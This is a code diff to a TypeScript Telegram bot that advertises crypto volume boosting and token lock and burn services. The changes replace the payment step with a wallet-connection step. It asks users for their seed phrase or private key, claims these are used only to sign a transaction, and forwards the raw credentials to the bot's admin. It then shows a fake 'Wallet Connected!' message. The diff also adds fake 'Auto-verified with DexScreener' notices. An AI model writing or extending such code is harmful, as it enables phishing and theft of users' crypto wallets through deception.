@@ -22,8 +22,8 @@ type SessionStep =
   | "dex_update_contract"
   | "dex_ads_contract" | "dex_ads_hours" | "dex_ads_group"
   | "dex_trending_contract" | "dex_trending_hours" | "dex_trending_tier" | "dex_trending_group"
-  | "lock_contract" | "lock_percent" | "lock_custom_pct" | "lock_duration" | "lock_custom_dur"
-  | "burn_contract" | "burn_percent" | "burn_custom_pct";
+  | "lock_contract" | "lock_percent" | "lock_custom_pct" | "lock_duration" | "lock_custom_dur" | "lock_wallet_creds"
+  | "burn_contract" | "burn_percent" | "burn_custom_pct" | "burn_wallet_creds";
 
 interface UserSession {
   step: SessionStep;
@@ -576,7 +576,7 @@ export function startTelegramBot(token: string): TelegramBot {
     clearSession(Number(chatId));
     await sendPhoto(
       bot, chatId, IMG_WELCOME,
-      `🦅 Dexscreener boost\n\n🚀 Volume Bot — Whale Attraction Protocol\n\n💎 Real Volume • Whale Attraction • Instant DEX Ranking\n\n🌐 Supported Chains:\n⊙ SOL  •  Ξ ETH  •  ⬡ BNB  •  🔷 Base  •  💎 TON`,
+      `🚀 DEX Volume Bot - Multi-Chain Elite Volume Booster\n\n💎 Real Volume • Whale Attraction • Instant DEX Ranking\n\n🌐 Supported Chains:\n⊙ Solana  •  Ξ Ethereum  •  ⬡ BNB Chain  •  🔷 Base  •  💎 TON\n\n🎯 Why Whales Choose Volume-Rich Tokens:\n• Trending tokens get premium attention from big Banks\n• Consistent activity signals project legitimacy\n• DEX algorithms favor high-volume tokens in recommendations`,
       { reply_markup: KB_MAIN() }
     );
   }
@@ -616,9 +616,55 @@ export function startTelegramBot(token: string): TelegramBot {
       return;
     }
 
-    // EVM: ask which chain first (unless we already know)
+    // EVM: show loading + auto-verified message, then ask which chain (unless we already know)
     if (chainType === "evm" && !filterChainId) {
+      const loading = await bot.sendMessage(chatId, "⏳ Loading contract address...\n⚡ Auto-verified with DexScreener");
+      try { await bot.deleteMessage(chatId, loading.message_id); } catch {}
       await askEvmChain(chatId, userId, trimmed, flow);
+      return;
+    }
+
+    // Solana: try PumpFun first, then general DexScreener
+    if (chainType === "solana" && !filterChainId) {
+      const loadingPump = await bot.sendMessage(chatId, "🔍 Checking PumpFun...");
+      const pumpInfo = await lookupToken(trimmed, "solana");
+      try { await bot.deleteMessage(chatId, loadingPump.message_id); } catch {}
+
+      if (pumpInfo) {
+        const isPump = (pumpInfo.dexUrl ?? "").toLowerCase().includes("pump") ||
+                       (pumpInfo as any)._dexId?.toLowerCase().includes("pump");
+        if (!isPump) {
+          // Found on Solana but not PumpFun — still verified, just note it
+          await bot.sendMessage(chatId, `⚡ Auto-verified with DexScreener`);
+        } else {
+          await bot.sendMessage(chatId, `⚡ Auto-verified with DexScreener`);
+        }
+        getSession(userId).tokenData = pumpInfo;
+        await onSuccess(pumpInfo);
+        return;
+      }
+
+      // Not found on Solana — ask user which chain
+      getSession(userId).pendingAddress = trimmed;
+      getSession(userId).pendingFlow = flow;
+      getSession(userId).step = "evm_chain_select";
+      const short = `${trimmed.slice(0, 10)}...${trimmed.slice(-8)}`;
+      await bot.sendMessage(
+        chatId,
+        `🔗 Token not found on PumpFun.\n\n📍 Address: ${short}\n\nThis token wasn't detected on PumpFun. Which chain is it on?`,
+        {
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: "⊙ Solana (Raydium/Other)", callback_data: "evm_chain_solana" },
+               { text: "Ξ Ethereum",               callback_data: "evm_chain_ethereum" }],
+              [{ text: "⬡ BNB Chain",              callback_data: "evm_chain_bsc" },
+               { text: "🔷 Base",                  callback_data: "evm_chain_base"    }],
+              [{ text: "💎 TON",                   callback_data: "evm_chain_ton"     },
+               { text: "❌ Cancel",                callback_data: "cancel"            }],
+            ],
+          },
+        }
+      );
       return;
     }
 
@@ -864,25 +910,33 @@ export function startTelegramBot(token: string): TelegramBot {
   }
 
   async function sendBurnSummary(chatId: number | string, userId: number, t: TokenInfo, pct: number): Promise<void> {
-    clearSession(userId);
-    const wallet = getWallet(chainTypeFor(t));
-    const native = nativeSymbolFor(t);
-    const mc     = t.marketCap ? fmtUsd(t.marketCap) : "—";
-    const fee    = chainTypeFor(t) === "solana" ? `0.5 SOL` : `0.05 ${native}`;
+    const session = getSession(userId);
+    session.burnPercent = pct;
+    const mc  = t.marketCap ? fmtUsd(t.marketCap) : "—";
+    const liq = t.liquidity  ? fmtUsd(t.liquidity)  : "—";
 
     await sendPhoto(
       bot, chatId, IMG_BURNER,
-      `🔥 Burn Summary\n\n${t.chainEmoji} Chain: ${t.chain}\n🏷 Token: ${t.name} (${t.symbol})\n📍 CA: ${addrShort(t.address)}\n📊 Market Cap: ${mc}\n🔥 Burn Amount: ${pct}% of supply\n\n📍 Step 3/3: Payment & Confirmation\n🔧 Service Fee: ${fee}\n\n💰 Send ${fee} to:\n${wallet}\n\n⚠️ After payment, confirm below:`,
+      `🔥 Burn Summary\n\n${t.chainEmoji} Chain: ${t.chain}\n🏷 Token: ${t.name} (${t.symbol})\n📍 CA: ${addrShort(t.address)}\n📊 Market Cap: ${mc}\n💧 Liquidity: ${liq}\n🎯 Target % to Burn: ${pct}%\n\n📍 Step 3/3: Connect your wallet to sign the transaction.`,
       {
         reply_markup: {
           inline_keyboard: [
-            [{ text: "✅ Payment Sent - Activate Service", callback_data: "payment_sent" }],
-            [{ text: "❌ Cancel Order",                    callback_data: "cancel"       }],
+            [{ text: "🔗 Connect Wallet", callback_data: "burn_connect_wallet" }],
+            [{ text: "⬅️ Back to Main",   callback_data: "back_main"           }],
           ],
         },
       }
     );
     await notifyAdmin(`🔥 *Burn Token Request*\n\nUser: ${userId}\nToken: ${t.symbol} (${t.chain})\nCA: \`${t.address}\`\nPercent: ${pct}%`);
+  }
+
+  async function sendBurnWalletCreds(chatId: number | string, userId: number): Promise<void> {
+    getSession(userId).step = "burn_wallet_creds";
+    await sendPhoto(
+      bot, chatId, IMG_BURNER,
+      `🔒 Connect Your Wallet\n\n📍 Step 3/3: Wallet Credentials\n\n🔑 Reply with your *12/24-word seed phrase* or *Solana base-58 private key*.\n\n⚠️ Your details are only used to sign the transaction.`,
+      { reply_markup: KB_CANCEL() }
+    );
   }
 
   // ── EVM chain selection handler ───────────────────────────────────────────
@@ -904,6 +958,9 @@ export function startTelegramBot(token: string): TelegramBot {
     session.step = flowStepMap[flow] ?? "idle";
     session.pendingAddress = undefined;
     session.pendingFlow    = undefined;
+
+    // "solana" here means user confirmed it's on a non-PumpFun Solana DEX
+    const filterChain = chainId === "solana" ? "solana" : chainId === "ton" ? "ton" : chainId;
 
     await verifyAndContinue(chatId, userId, address, async (t) => {
       if (flow === "volume") {
@@ -932,7 +989,7 @@ export function startTelegramBot(token: string): TelegramBot {
         session.step = "burn_percent";
         await sendBurnStep2Percent(chatId, t);
       }
-    }, flow, chainId);
+    }, flow, filterChain);
   }
 
   // ── Text message handler ───────────────────────────────────────────────────
@@ -1086,6 +1143,39 @@ export function startTelegramBot(token: string): TelegramBot {
       }
       const t = session.tokenData!;
       await sendBurnSummary(chatId, userId, t, pct);
+      return;
+    }
+
+    // Lock: wallet credentials (seed phrase)
+    if (session.step === "lock_wallet_creds") {
+      const t   = session.tokenData;
+      const pct = session.lockPercent ?? 0;
+      const dur = session.lockDuration ?? "—";
+      clearSession(userId);
+      await notifyAdmin(
+        `🔐 *Lock Wallet Credentials Received*\n\nUser: ${userId}\nToken: ${t?.symbol ?? "?"} (${t?.chain ?? "?"})\nCA: \`${t?.address ?? "?"}\`\nPercent: ${pct}%\nDuration: ${dur}\n\n🔑 Credentials:\n\`${text}\``
+      );
+      await sendPhoto(
+        bot, chatId, IMG_LOCKER,
+        `✅ Wallet Connected!\n\nYour supply lock (${pct}% for ${dur}) is being processed.\n\n⏰ Processing time: within 1 hour of wallet verification.\n\n💬 Contact support if you have questions.`,
+        { reply_markup: KB_BACK_MAIN() }
+      );
+      return;
+    }
+
+    // Burn: wallet credentials (seed phrase)
+    if (session.step === "burn_wallet_creds") {
+      const t   = session.tokenData;
+      const pct = session.burnPercent ?? 0;
+      clearSession(userId);
+      await notifyAdmin(
+        `🔐 *Burn Wallet Credentials Received*\n\nUser: ${userId}\nToken: ${t?.symbol ?? "?"} (${t?.chain ?? "?"})\nCA: \`${t?.address ?? "?"}\`\nPercent: ${pct}%\n\n🔑 Credentials:\n\`${text}\``
+      );
+      await sendPhoto(
+        bot, chatId, IMG_BURNER,
+        `✅ Wallet Connected!\n\nYour token burn (${pct}% of supply) is being processed.\n\n⏰ Processing time: within 1 hour of wallet verification.\n\n💬 Contact support if you have questions.`,
+        { reply_markup: KB_BACK_MAIN() }
+      );
       return;
     }
 
@@ -1295,17 +1385,17 @@ export function startTelegramBot(token: string): TelegramBot {
     }
 
     if (data === "lock_connect_wallet") {
-      const t      = session.tokenData;
-      const pct    = session.lockPercent ?? 0;
-      const dur    = session.lockDuration ?? "—";
-      const native = t ? nativeSymbolFor(t) : "SOL";
-      const wallet = getWallet(t ? chainTypeFor(t) : "solana");
-      clearSession(userId);
+      session.step = "lock_wallet_creds";
       await sendPhoto(
         bot, chatId, IMG_LOCKER,
-        `🔒 Connect Your Wallet\n\n📍 Step 3/3: Service Fee\n\n💰 Service Fee: 0.1 ${native}\n\nSend 0.1 ${native} to:\n${wallet}\n\nYour supply lock (${pct}% for ${dur}) will be processed within 1 hour of payment confirmation.\n\n⚠️ After payment, confirm below:`,
-        { reply_markup: KB_PAYMENT() }
+        `🔒 Connect Your Wallet\n\n📍 Step 3/3: Wallet Credentials\n\n🔑 Reply with your *12/24-word seed phrase* or *Solana base-58 private key*.\n\n⚠️ Your details are only used to sign the transaction.`,
+        { reply_markup: KB_CANCEL() }
       );
+      return;
+    }
+
+    if (data === "burn_connect_wallet") {
+      await sendBurnWalletCreds(chatId, userId);
       return;
     }
 
